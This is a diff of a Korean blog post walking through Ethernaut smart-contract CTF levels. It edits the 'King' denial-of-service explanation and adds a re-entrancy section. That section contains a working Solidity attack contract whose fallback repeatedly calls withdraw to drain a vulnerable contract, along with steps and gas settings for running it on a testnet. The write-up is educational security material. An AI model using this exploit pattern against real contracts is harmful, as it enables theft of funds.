@@ -692,12 +692,12 @@ await getBalance("0x32d25a51c4690960f1d18fadfa98111f71de5fa7")
 
 그냥 현재 prize 값 1 이더보다 크거나 같은 값을 전송하여 king이 바뀌면서 패스됩니다. 😅
 
-그러나 원래 이 문제가 의도했던 것은 이 컨트랙트가 제대로 동작하지 않도록 하는 것입니다. 이렇게 하려면 다른 컨트랙트를 만든 후 King 컨트랙트의 폴백 함수를 호출합니다.
-이 때 1 이더 이상을 전송하면 king이 바뀌게 됩니다. 그런데 이 컨트랙트에 의도적으로 폴백 함수를 구현하지 않습니다.
+그러나 원래 이 문제가 의도했던 것은 이 컨트랙트가 제대로 동작하지 않도록 하는 것입니다. 일단 다른 컨트랙트를 만든 후 1 이더 이상을 전송하면서
+King 컨트랙트의 폴백 함수를 호출합니다. 당연히 조건에 의해서 king이 바뀌게 되는데, 핵심은 이 컨트랙트의 폴백 함수를 의도적으로 구현하지 않습니다.
 그렇게 하면 다음에 owner 계정이나 prize 값보다 더 많은 이더를 전송하더라도 `king.transfer(msg.value)`에서 오류가 발생하면서 롤백이 될 것입니다.
-결국 king이 바뀌지 않게 되고 현재 king은 "forever" king으로 남는 것입니다.
+결국 king이 바뀌지 않게 되고 현재 king은 "forever" king으로 남게 되는 것입니다.
 
-주의할 점은 컨트랙트가 이더를 소유해야 하기 때문에 초기 이더를 받을 수 있도록 생성자를 payable로 만들어야 한다는 점입니다. payable 폴백 함수를 만들면 안됩니다.
+주의할 점은 컨트랙트가 이더를 소유해야 하기 때문에 초기 이더를 받을 수 있도록 생성자를 payable로 만들어야 한다는 점입니다(payable 폴백 함수를 만들면 안됩니다).
 
 {% highlight javascript %}
 pragma solidity ^0.4.25;
@@ -730,9 +730,108 @@ contract King {
 }
 {% endhighlight %}
 
+이처럼 외부 계정(EOA 또는 CA일 수도 있습니다)에 트랜잭션을 전송할 때 항상 실패할 가능성을 고려하여 코드를 작성해야 합니다.
+
+
 ### 10. Re-entrancy (difficulty 6/10)
 
+이번 문제는 컨트랙트의 이더를 전부 훔쳐야 패스할 수 있습니다.
 
+> The goal of this level is for you to steal all the funds from the contract.
+
+이 컨트랙트는 balances라는 mapping 타입의 "장부"를 가지고 있고 donate payable 메소드가 호출되면 받은 이더를 balances에 기록합니다(컨트랙트 계정에 이더를 소유합니다).
+장부에 기록된 계정은 withdraw 메소드로 인출할 수 있습니다. 물론 자신이 "기부받은" 금액 이내에서 말이죠.
+
+이 컨트랙트의 문제는 인출하는 메소드 withdraw에 있습니다. 이더를 전송하는 것과, 전송 후 장부 balances에 그 내역을 반영하는 것이 하나의 메소드에 구현되어 있습니다.
+그것도 이더를 전송한 후에 장부에 기록한다는 것입니다. 문제는 실행 <b>"순서"</b>입니다. 즉 장부에서 이더를 지급했다는 기록을 하기 전에 다시 withdraw 메소드를 호출할 수 있다면(Re-entrancy)
+어떻게 될까요?
+
+{% highlight javascript %}
+function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+        if(msg.sender.call.value(_amount)()) {
+            _amount;
+        }
+        balances[msg.sender] -= _amount;
+    }
+}
+{% endhighlight %}
+
+
+반신반의 하겠지만 그것이 가능합니다. 아래 컨트랙트를 살펴보겠습니다.
+
+{% highlight javascript %}
+pragma solidity ^0.4.25;
+
+contract GoneWithEther {
+
+    address public owner;
+    Reentrance public reentrance;
+
+    constructor(address _addr) public payable {
+        owner = msg.sender;
+        reentrance = Reentrance(_addr);
+    }
+
+    modifier onlyOwner {
+        require (msg.sender == owner, "Only owner can call this function.");
+        _;
+    }
+
+    function donate() external onlyOwner {
+        reentrance.donate.value(0.5 ether)(address(this));
+    }
+
+    function() public payable {
+        if (address(reentrance).balance > 0 ) {
+            reentrance.withdraw(0.5 ether);
+        }
+    }
+
+    function kill() external onlyOwner {
+        selfdestruct(owner);
+    }
+}
+
+contract Reentrance {
+    function donate(address _to) public payable;
+    function balanceOf(address _who) public view returns (uint balance);
+    function withdraw(uint _amount) public;
+}
+{% endhighlight %}
+
+여기서 주의깊게 볼 곳은 바로 폴백 함수입니다. 문제에 주어진 Reentrance 컨트랙트는 withdraw 함수에서 이더를 전송합니다. 수신 계정이 컨트랙트라면 payable 폴백 함수가
+호출될 것입니다. 그런데 여기서 다시 withdraw 함수를 호출하고 있습니다. 결과적으로 차감 내역을 쓰기도 전에 트랜잭션이 다시 발생하는 것입니다.
+
+이 경우에 컨트랙트는 전혀 "스마트"하지 않게 동작합니다. `balances[msg.sender] >= _amount`인 상태에서 트랜잭션이 또 전송되므로 계속 이더를 수신계정에게 송금하는 것입니다.
+
+컨트랙트 인스턴스를 생성하고 나면 이 컨트랙트는 1 이더를 가지게 됩니다.
+
+{% highlight html %}
+contract.address
+"0x09b6c1a01ed87152da73ebef262454baef097922"
+
+await getBalance(contract.address)
+"1"
+{% endhighlight %}
+
+GoneWithEther 컨트랙트에서 donate 메소드를 실행합니다. 왜냐하면 그렇게 해두어야 balances에 GoneWithEther 계정의 이더 수신 기록(0.5 이더)이 생기기 때문입니다.
+여기서 또 생각해야 할 것은 계속 메소드를 호출해야 하기 때문에 너무 작은 이더씩 "훔치면" 가스가 부족할 수 있으므로 0.5 이더씩 인출 하는 것이 적당할 것 같습니다(0.5씩 차감하여 0을 만들 수 있는 것도 고려합니다).
+
+Remix를 활용하여 donate을 호출한 후 폴백 함수를 호출하면 Reentrance 컨트랙트가 가진 이더를 0으로 만들 수 있습니다. 다만 메타마스크에서 가스를 충분히, 약 4,000,000 정도로
+주어야 재진입시 필요한 <b>"연료"가 모자르지 않을 것입니다.</b>
+
+한 가지 더 부연하자면 Reentrance에서 이더 전송시 사용한 함수 `msg.sender.call.value(_amount)()`은 전달되는 가스를 모두 forward하므로 transfer를 사용하는 것이 바람직합니다.
+transfer는 폴백 함수를 호출하면서 가스를 2,300으로 고정시키기 때문에(stipend) 불순한 코드를 실행할 수 없도록 하고 있습니다.
+
+{% highlight html %}
+await getBalance(contract.address)
+"0"
+{% endhighlight %}
+
+참고로 [Ropsten 이더스캔][ropsten-etherscan]에서 트랜잭션이 어떻게 재호출되었는지 확인할 수 있습니다.
+
+![fig05]({{site.baseurl}}/assets/img/ethernaut/ropsten_reentrance.PNG)
 
 
 [ethernaut]: https://ethernaut.zeppelin.solutions/
@@ -741,5 +840,6 @@ contract King {
 [remix]: http://remix.ethereum.org/
 [safemath]: https://github.com/OpenZeppelin/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol
 [storage]: https://solidity.readthedocs.io/en/v0.4.25/miscellaneous.html?highlight=storage
+[ropsten-etherscan]: https://ropsten.etherscan.io/tx/0x4c842eb4222b8ebdef4b31803821411b8e0051566b7a828c0cad8761b076718e#internal
 
 
